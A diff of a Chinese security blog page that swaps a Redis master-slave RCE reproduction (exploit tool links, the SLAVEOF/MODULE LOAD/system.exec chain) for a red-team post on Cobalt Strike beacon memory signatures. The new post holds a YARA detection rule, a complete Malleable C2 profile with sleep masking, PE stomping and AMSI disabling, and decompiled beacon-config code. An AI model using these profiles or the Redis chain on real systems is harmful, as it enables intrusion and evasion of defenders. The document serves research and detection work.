@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Redis-RCE复现 | 九世的博客</title>
-  <meta name="keywords" content=" 漏洞复现 ">
-  <meta name="description" content="Redis-RCE复现 | 九世的博客">
+  <title>关于这几天cs进程里的特征和网上的一些bypass | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="关于这几天cs进程里的特征和网上的一些bypass | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1873,9 +1873,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Redis-RCE复现" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-关于这几天cs进程里的特征和网上的一些bypass" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Redis-RCE复现</h1>
+        <h1 class="article-title">关于这几天cs进程里的特征和网上的一些bypass</h1>
     
     <div class="article-meta">
         
@@ -1884,14 +1884,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">漏洞复现</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-01-21 17:43:03">2020-01-21 16:24</time>
+        创建时间:<time class="date" title="更新时间: 2021-09-11 18:08:25">2021-09-11 17:53</time>
         
     </div>
     <div class="article-meta">
@@ -1913,7 +1913,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#造成漏洞的原因"><span class="toc-text">造成漏洞的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用点"><span class="toc-text">利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御"><span class="toc-text">防御</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1928,34 +1928,518 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有点沉迷于B站….草了狗。还是学习吧<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1579605325992&amp;di=f29b807ed67a97ea5df63dc2c8a366a0&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fblog%2F201508%2F25%2F20150825090550_vBntQ.jpeg" alt=""></p>
-<h2 id="造成漏洞的原因"><a href="#造成漏洞的原因" class="headerlink" title="造成漏洞的原因"></a>造成漏洞的原因</h2><blockquote>
-<p>通过主从复制 GetShell<br>在介绍这种利用方式之前，首先我们需要介绍一下什么是主从复制和redis的模块。<br>Redis主从复制<br>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
-</blockquote>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><pre><code>apt install redis-server
-</code></pre><p>修改/etc/redis/redis.conf</p>
-<pre><code>bind 127.0.0.1 -&gt; bind 0.0.0.0
-protected-mode -yes -&gt; protected-mode no
-</code></pre><p>exp地址：</p>
-<pre><code>https://github.com/Ridter/redis-rce - 利用工具
-https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so - exp.so
-</code></pre><p><img src="https://s2.ax1x.com/2020/01/21/1kCbPf.png" alt=""></p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那么实现shell的过程中实现了什么？先从py下手</p>
-<pre><code>1.读取exp.so
-2.调用runserver函数处理  runserver(options.rhost, options.rport, options.lhost, options.lport) #目标IP、目标端口、attack IP、attack监听的端口（默认监听21000端口）
-3.调用Remote.do() #发送Redis密码验证，并返回结果，如果返回invalid password代表密码错误
-4.密码正确，redis登录成功后，发送info指令查看redis数据库详细信息
-5.发送SLAVEOF指令，指令格式 SLAVEOF host port。作用通过执行 SLAVEOF host port 命令，可以将当前服务器转变为指定服务器的从属服务器(slave server)，这里的host和port则指向attack的IP和端口
-6.发送CONFIG SET dbfilename &lt;name&gt; 设置文件名称(根据exp.so的文件名来设置的文件名，比如exp.so。设置的dbfilename就是exp)
-7.监听本机21000端口，等待redis回传的数据。根据返回的结果将exp转换成bytes，发送exp
-8.MODULE LOAD指令加载exp.so
-9.取消从属服务器
-10.根据选择是进入shell或者执行其他指令
-12.若是执行shell指令，则调用exp.so里面的system.exec函数后面跟上命令。system.exec &lt;command&gt;
-</code></pre><p>总的来说是，设置从属服务器后。在设置dbfilename，之后发送shellcode。应该是被Redis-Server保存了。然后加载扩展，调用system.exec函数执行命令。</p>
-<h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><p>1.低权的时候，redis以root权限运行。通过RCE获得root权限<br>2.未授权直接利用</p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1.设置本机才能访问<br>2.设置复杂性密码<br>3.Redis-server不以root权限运行</p>
+        <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/" target="_blank" rel="noopener">https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/</a><br><a href="https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg</a><br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>首先cs上线进程注入个进程<br><img src="https://z3.ax1x.com/2021/09/11/hzyILF.png" alt=""></p>
+<p>使用ProcessHacker定位到SleepEx函数<br><img src="https://z3.ax1x.com/2021/09/11/hzy7dJ.png" alt=""></p>
+<p>转到内存保存可以看到明显的MZ头<br><img src="https://z3.ax1x.com/2021/09/11/hzyxsO.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hz6Zy8.png" alt=""></p>
+<p>利用给出的yara规则进行进程检测，可以很明显的发现是cs的进程<br><a href="https://github.com/jas502n/cs_yara" target="_blank" rel="noopener">https://github.com/jas502n/cs_yara</a><br>遍历进程寻找cs的进程：powershell -command “Get-Process | ForEach-Object {./yara64.exe beaconEye.yar $_.ID -s}”<br><img src="https://z3.ax1x.com/2021/09/11/hz6rSx.png" alt=""></p>
+<pre><code>rule CobaltStrike {
+  strings:  
+    $cobaltStrikeRule64 = {  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00 (00|01|02|04|08|10) 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00 }
+    $cobaltStrikeRule32 = {  00 00 00 00 00 00 00 00  01 00 00 00 (00|01|02|04|08|10) 00 00 00 01 00 00 00 ?? ?? 00 00  02 00 00 00 ?? ?? ?? ??  02 00 00 00 ?? ?? ?? ??  01 00 00 00 ?? ?? 00 00 }
+  condition: any of them
+}
+</code></pre><p>cs的c2profile的sleep_mask是sleep xor加密的算法是否开启<br><img src="https://z3.ax1x.com/2021/09/11/hz64fI.png" alt=""></p>
+<p>sleep.profile</p>
+<pre><code>#This profile is meant to show all of the options available in Malleable C2
 
+
+
+
+#Various options
+
+
+# Append random-length string (up to data_jitter value) to http-get and http-post server output
+
+
+set sample_name &quot;Test Profile&quot;;
+set dns_idle &quot;0.0.0.0&quot;;
+set dns_max_txt &quot;252&quot;;
+set dns_sleep &quot;0&quot;;
+set dns_stager_prepend &quot;&quot;;
+set dns_stager_subhost &quot;.stage.123456.&quot;;
+set dns_ttl &quot;1&quot;;
+set host_stage &quot;true&quot;; #Host payload for staging over set, setS, or DNS. Required by stagers.
+set jitter &quot;0&quot;;
+set maxdns &quot;255&quot;;
+set pipename &quot;msagent_###&quot;; #Default name of pipe to use for SMB Beacon’s peer-to-peer communication. Each # is replaced witha random hex value.
+set pipename_stager &quot;status_##&quot;;
+set sleeptime &quot;60000&quot;; #def sleep in ms
+set smb_frame_header &quot;&quot;;
+set ssh_banner &quot;Cobalt Strike 4.2&quot;;
+
+
+set tcp_frame_header &quot;&quot;;
+set tcp_port &quot;4444&quot;;
+
+
+# Defaults for ALL CS set server responses
+
+
+http-config {
+    set headers &quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;;
+    header &quot;Server&quot; &quot;Apache&quot;;
+    header &quot;Keep-Alive&quot;&quot;timeout=5, max=100&quot;;
+    header &quot;Connection&quot;&quot;Keep-Alive&quot;;
+
+
+#   The set trust_x_forwarded_foroption decides if Cobalt Strike uses the
+# X-Forwarded-For set header to determine the remote address of a request.
+# Use this option if your Cobalt Strike server is behind an set redirector    
+    set trust_x_forwarded_for &quot;true&quot;;
+
+
+
+
+
+}
+
+
+
+
+
+
+https-certificate {
+    set C &quot;US&quot;; #Country
+    set CN &quot;localhost&quot;; # CN - you will probably nver use this, but don&#39;t leave at localost
+    set L &quot;San Francisco&quot;; #Locality
+    set OU &quot;IT Services&quot;; #Org unit
+    set O &quot;FooCorp&quot;; #Org name
+    set ST &quot;CA&quot;; #State
+    set validity &quot;365&quot;;
+
+
+    # if using a valid vert, specify this, keystore = java keystore
+    #set keystore &quot;domain.store&quot;;
+    #set password &quot;mypassword&quot;;
+
+
+}
+
+
+
+
+#If you have code signing cert:
+#code-signer {
+#    set keystore &quot;keystore.jks&quot;;
+#    set password &quot;password&quot;;
+#    set alias    &quot;server&quot;;
+#    set timestamp &quot;false&quot;;
+#    set timestamp_url &quot;set://timestamp.digicert.com&quot;;
+#}
+
+
+
+
+
+
+#Stager is only supported as a GET request and it will use AFAICT the IE on Windows.
+http-stager {
+    set uri_x86 &quot;/api/v1/GetLicence&quot;;     
+    set uri_x64 &quot;/api/v2/GetLicence&quot;;
+    client {
+        parameter &quot;uuid&quot; &quot;96c5f1e1-067b-492e-a38b-4f6290369121&quot;;
+        #header &quot;headername&quot; &quot;headervalue&quot;;
+    }
+    server {
+        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;    
+        header &quot;Content-Encoding&quot; &quot;gzip&quot;;    
+        output {        
+            #GZIP headers and footers
+            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;
+            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;
+            #AFAICT print is the only supported terminator
+            print;
+        }
+    }
+}
+
+
+
+
+#This is used only in http-get and http-post and not during stage
+set useragent &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;
+
+
+# define indicators for an set GET
+http-get {
+    # we require a stub URI to attach the rest of our data to.
+    set uri &quot;/api/v1/Updates&quot;;
+
+
+    client {
+
+
+        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;
+        # mask our metadata, base64 encode it, store it in the URI
+        metadata {
+
+
+
+
+            # XOR encode the value
+            mask;
+
+            # URL-safe Base64 Encode
+            #base64url;
+
+
+            # URL-safe Base64 Encode
+            base64;
+
+
+            # NetBIOS Encode ‘a’ ?
+            #netbios;
+
+
+            #NetBIOS Encode ‘A’
+            #netbiosu;
+
+
+            # You probably want these to be last two, else you will encode these values
+
+
+            # Append a string to metadata
+            append &quot;;&quot; ;
+
+
+            # Prepend a string
+            prepend &quot;SESSION=&quot;;
+            # Terminator statements - these say where the metadata goes
+            # Pick one
+
+
+            # Append to URI
+            #uri-append;
+
+
+
+
+
+            #Set in a header
+            header &quot;Cookie&quot;;
+
+
+            #Send data as transaction body
+            #print
+
+
+            #Store data in a URI parameter
+            #parameter &quot;someparam&quot;
+
+
+        }
+    }
+
+
+    server {
+        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;
+        header &quot;Content-Encoding&quot; &quot;gzip&quot;;
+        # prepend some text in case the GET is empty.
+        output {
+            mask;
+            base64;
+            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;
+            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;            
+            print;
+        }
+    }
+}
+
+
+# define indicators for an set POST
+http-post {
+    set uri &quot;/api/v1/Telemetry/Id/&quot;;
+    set verb &quot;POST&quot;;
+
+
+    client {
+        # make it look like we&#39;re posting something cool.
+        header &quot;Content-Type&quot; &quot;application/json&quot;;
+        header &quot;Accept-Encoding&quot; &quot;deflate, gzip;q=1.0, *;q=0.5&quot;;
+
+
+        # ugh, our data has to go somewhere!
+        output {
+
+
+            mask;
+            base64url;
+            uri-append;
+        }
+
+
+        # randomize and post our session ID
+        id {
+            mask;
+            base64url;
+            prepend &quot;{version: 1, d=\x22&quot;;            
+            append &quot;\x22}\n&quot;;
+            print;
+        }
+    }
+
+
+    # The server&#39;s response to our set POST
+    server {
+        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;
+        header &quot;Content-Encoding&quot; &quot;gzip&quot;;
+
+
+        # post usually sends nothing, so let&#39;s prepend a string, mask it, and
+        # base64 encode it. We&#39;ll get something different back each time.
+        output {
+            mask;
+            base64;
+            prepend &quot;\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03&quot;;
+            append &quot;\x7F\x01\xDD\xAF\x58\x52\x07\x00&quot;;            
+            print;
+        }
+
+
+
+    }
+}
+
+
+
+
+stage {
+
+
+
+#    The transform-x86 and transform-x64 blocks pad and transform Beacon’s
+# Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
+    transform-x86 {
+        prepend &quot;\x90\x90&quot;;
+        strrep &quot;ReflectiveLoader&quot; &quot;DoLegitStuff&quot;;
+    }
+
+    transform-x64 {
+        # transform the x64 rDLL stage, same options as with
+    }
+    stringw &quot;I am not Beacon&quot;;
+
+
+    set cleanup &quot;true&quot;;        # Ask Beacon to attempt to free memory associated with
+                                # the Reflective DLL package that initialized it.
+
+    # Override the first bytes (MZ header included) of Beacon&#39;s Reflective DLL.
+    # Valid x86 instructions are required. Follow instructions that change
+    # CPU state with instructions that undo the change.
+
+#    set magic_mz_x86 &quot;MZRE&quot;;
+#    set magic_mz_x86 &quot;MZAR&quot;;
+
+
+
+
+    # Ask the x86 ReflectiveLoader to load the specified library and overwrite
+    #  its space instead of allocating memory with VirtualAlloc.
+    # Only works with VirtualAlloc
+    #set module_x86 &quot;xpsservices.dll&quot;;
+    #set module_x64 &quot;xpsservices.dll&quot;;
+
+
+    # Obfuscate the Reflective DLL’s import table, overwrite unused header content,
+    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
+    set obfuscate &quot;false&quot;;
+
+
+    # Obfuscate Beacon, in-memory, prior to sleeping
+    set sleep_mask &quot;true&quot;;
+
+
+    # Use embedded function pointer hints to bootstrap Beacon agent without
+    # walking kernel32 EAT
+    set smartinject &quot;true&quot;;
+
+
+    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after
+    # it loads Beacon payload
+    set stomppe &quot;true&quot;;
+
+
+
+
+    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory
+    set userwx &quot;false&quot;;
+
+
+#    set image_size_x86 &quot;512000&quot;;
+#    set image_size_x64 &quot;512000&quot;;
+    set entry_point &quot;92145&quot;;
+
+
+    #The Exported name of the Beacon DLL
+    #set name &quot;beacon.x64.dll&quot;
+
+    #set rich_header  # I don&#39;t understand this yet TODO: fixme
+
+
+    #TODO: add examples process-inject
+}
+process-inject {
+        # set how memory is allocated in a remote process
+        # VirtualAllocEx or NtMapViewOfSection. The
+        # NtMapViewOfSection option is for same-architecture injection only.
+        # VirtualAllocEx is always used for cross-arch memory allocations.
+
+
+        set allocator &quot;VirtualAllocEx&quot;;
+        # shape the memory characteristics and content
+        set min_alloc &quot;16384&quot;;
+        set startrwx &quot;true&quot;;
+        set userwx &quot;false&quot;;
+        transform-x86 {
+        prepend &quot;\x90\x90&quot;;
+        }
+        transform-x64 {
+        # transform x64 injected content
+        }
+        # determine how to execute the injected code
+        execute {
+            CreateThread &quot;ntdll.dll!RtlUserThreadStart&quot;;
+            SetThreadContext;
+            RtlCreateUserThread;
+        }
+}
+post-ex {
+    # control the temporary process we spawn to
+    set spawnto_x86 &quot;%windir%\\syswow64\\WerFault.exe&quot;;
+    set spawnto_x64 &quot;%windir%\\sysnative\\WerFault.exe&quot;;
+    # change the permissions and content of our post-ex DLLs
+    set obfuscate &quot;true&quot;;
+    # pass key function pointers from Beacon to its child jobs
+    set smartinject &quot;true&quot;;
+    # disable AMSI in powerpick, execute-assembly, and psinject
+    set amsi_disable &quot;true&quot;;
+
+
+
+
+    #The thread_hint option allows multi-threaded post-ex DLLs to spawn
+    # threads with a spoofed start address. Specify the thread hint as
+    # “module!function+0x##” to specify the start address to spoof.
+    # The optional 0x## part is an offset added to the start address.
+    # set thread_hint &quot;....TODO:FIXME&quot;
+}
+</code></pre><p>根据wx公众号的文章结尾所描述<br><img src="https://z3.ax1x.com/2021/09/11/hz6zpq.png" alt=""></p>
+<p>经过测试确实如此<br><img src="https://z3.ax1x.com/2021/09/11/hzc9XT.png" alt=""></p>
+<p>processhacker Memory所定位看到的内存是xor过的，MZ头也没了<br><img src="https://z3.ax1x.com/2021/09/11/hzcEN9.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hzcm1x.png" alt=""></p>
+<p>还是能检测出来<br><img src="https://z3.ax1x.com/2021/09/11/hzcujK.png" alt=""></p>
+<p>看到的文章中还有一篇是Hook SleepEx函数，然后进行修改 （由于个人过于垃圾无法复现该文章）<br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p>
+<p>最后就是跟着公众号文章分析了一下cs beacon生成的过程 （详细分析请看wx公众号的文章</p>
+<pre><code>BeaconConfig的生成在 BeaconPayload类的 exportBeaconStage函数中
+</code></pre><p><img src="https://z3.ax1x.com/2021/09/11/hzcY9I.png" alt=""></p>
+<p>exportBeaconStage</p>
+<pre><code>    protected byte[] exportBeaconStage(int paramInt, String paramString1, boolean paramBoolean1, boolean paramBoolean2, String paramString2)
+  {
+    try
+    {
+      long l1 = System.currentTimeMillis(); //返回当前世界时间(毫秒)
+      byte[] arrayOfByte1 = SleevedResource.readResource(paramString2); //读取对应的dll并解密数据
+      if (paramString1.length() &gt; 254) { //如果长度大于254则只读取0~254
+        paramString1 = paramString1.substring(0, 254);
+      }
+      String[] arrayOfString1 = this.c2profile.getString(&quot;.http-get.uri&quot;).split(&quot; &quot;); //get请求的路径读取
+      String[] arrayOfString2 = paramString1.split(&quot;,\\s*&quot;); //字符串分割
+      LinkedList localLinkedList = new LinkedList();
+      for (int i = 0; i &lt; arrayOfString2.length; i++) //遍历数据添加到localLinkedList
+      {
+        localLinkedList.add(arrayOfString2[i]);
+        localLinkedList.add(CommonUtils.pick(arrayOfString1));
+      }
+      while ((localLinkedList.size() &gt; 2) &amp;&amp; (CommonUtils.join(localLinkedList, &quot;,&quot;).length() &gt; 255))
+      {
+        str1 = localLinkedList.removeLast() + &quot;&quot;;
+        String str2 = localLinkedList.removeLast() + &quot;&quot;;
+        CommonUtils.print_info(&quot;dropping &quot; + str2 + str1 + &quot; from Beacon profile for size&quot;);
+      }
+      String str1 = randua(this.c2profile);
+      int j = Integer.parseInt(this.c2profile.getString(&quot;.sleeptime&quot;)); //c2profile延时时间读取
+      String str3 = CommonUtils.pick(this.c2profile.getString(&quot;.http-post.uri&quot;).split(&quot; &quot;)); //post请求的路径
+      byte[] arrayOfByte2 = this.c2profile.recover_binary(&quot;.http-get.server.output&quot;);//server头返回
+      byte[] arrayOfByte3 = this.c2profile.apply_binary(&quot;.http-get.client&quot;);//client请求
+      byte[] arrayOfByte4 = this.c2profile.apply_binary(&quot;.http-post.client&quot;);//post client请求
+      int k = this.c2profile.size(&quot;.http-get.server.output&quot;, 1048576); //get请求返回
+      int m = Integer.parseInt(this.c2profile.getString(&quot;.jitter&quot;));
+      if ((m &lt; 0) || (m &gt; 99)) {
+        m = 0;
+      }
+      int n = Integer.parseInt(this.c2profile.getString(&quot;.maxdns&quot;));
+      if ((n &lt; 0) || (n &gt; 255)) {
+        n = 255;
+      }
+      int i1 = 0;
+      if (paramBoolean1) {
+        i1 |= 0x1;
+      }
+      if (paramBoolean2) {
+        i1 |= 0x8;
+      }
+      long l2 = CommonUtils.ipToLong(this.c2profile.getString(&quot;.dns_idle&quot;));
+      int i2 = Integer.parseInt(this.c2profile.getString(&quot;.dns_sleep&quot;)); //dns延迟读取
+      Settings localSettings = new Settings(); //beacon配置
+      localSettings.addShort(1, i1);
+      localSettings.addShort(2, paramInt);
+      localSettings.addInt(3, j);
+      localSettings.addInt(4, k);
+      localSettings.addShort(5, m);
+      localSettings.addShort(6, n);
+      localSettings.addData(7, this.publickey, 256);
+      localSettings.addString(8, CommonUtils.join(localLinkedList, &quot;,&quot;), 256);
+      localSettings.addString(9, str1, 128);
+      localSettings.addString(10, str3, 64);
+      localSettings.addData(11, arrayOfByte2, 256);
+      localSettings.addData(12, arrayOfByte3, 256);
+      localSettings.addData(13, arrayOfByte4, 256);
+      localSettings.addData(14, CommonUtils.asBinary(this.c2profile.getString(&quot;.spawnto&quot;)), 16);
+      localSettings.addString(29, this.c2profile.getString(&quot;.post-ex.spawnto_x86&quot;), 64);
+      localSettings.addString(30, this.c2profile.getString(&quot;.post-ex.spawnto_x64&quot;), 64);
+      localSettings.addString(15, &quot;&quot;, 128);
+      localSettings.addShort(31, QuickSecurity.getCryptoScheme());
+      localSettings.addInt(19, (int)l2);
+      localSettings.addInt(20, i2);
+      localSettings.addString(26, this.c2profile.getString(&quot;.http-get.verb&quot;), 16);
+      localSettings.addString(27, this.c2profile.getString(&quot;.http-post.verb&quot;), 16);
+      localSettings.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);
+      localSettings.addInt(37, this.c2profile.getInt(&quot;.watermark&quot;));
+      localSettings.addShort(38, this.c2profile.option(&quot;.stage.cleanup&quot;) ? 1 : 0);
+      localSettings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
+      String str4 = this.listener.getHostHeader();
+      if ((str4 == null) || (str4.length() == 0)) {
+        localSettings.addString(54, &quot;&quot;, 128);
+      } else if (Profile.usesHostBeacon(this.c2profile)) {
+        localSettings.addString(54, &quot;&quot;, 128);
+      } else {
+        localSettings.addString(54, &quot;Host: &quot; + this.listener.getHostHeader() + &quot;\r\n&quot;, 128);
+      }
+      if (Profile.usesCookieBeacon(this.c2profile)) {
+        localSettings.addShort(50, 1);
+      } else {
+        localSettings.addShort(50, 0);
+      }
+      ProxyServer localProxyServer = ProxyServer.parse(this.listener.getProxyString()); //代理
+      localProxyServer.setup(localSettings);
+      setupPivotFrames(this.c2profile, localSettings);
+      setupKillDate(localSettings);
+      setupGargle(localSettings, paramString2);
+      new ProcessInject(this.c2profile).apply(localSettings);
+      byte[] arrayOfByte5 = localSettings.toPatch();
+      arrayOfByte5 = beacon_obfuscate(arrayOfByte5); //xor
+      String str5 = CommonUtils.bString(arrayOfByte1);
+      int i3 = str5.indexOf(&quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;);
+      str5 = CommonUtils.replaceAt(str5, CommonUtils.bString(arrayOfByte5), i3);
+      return CommonUtils.toBytes(str5);
+    }
+    catch (IOException localIOException)
+    {
+      MudgeSanity.logException(&quot;export Beacon stage: &quot; + paramString2, localIOException, false);
+    }
+    return new byte[0];
+  }
+</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -1964,12 +2448,12 @@ https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so - exp.so
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Redis-RCE复现</p>
+    <p><span class="copy-title">文章标题:</span>关于这几天cs进程里的特征和网上的一些bypass</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-21, 16:24:51</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-21, 17:43:03</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ac34060e.html" title="Redis-RCE复现">http://422926799.github.io/posts/ac34060e.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-09-11, 17:53:15</p>
+    <p><span class="copy-title">最后更新:</span>2021-09-11, 18:08:25</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/40a5ffce.html" title="关于这几天cs进程里的特征和网上的一些bypass">http://422926799.github.io/posts/40a5ffce.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
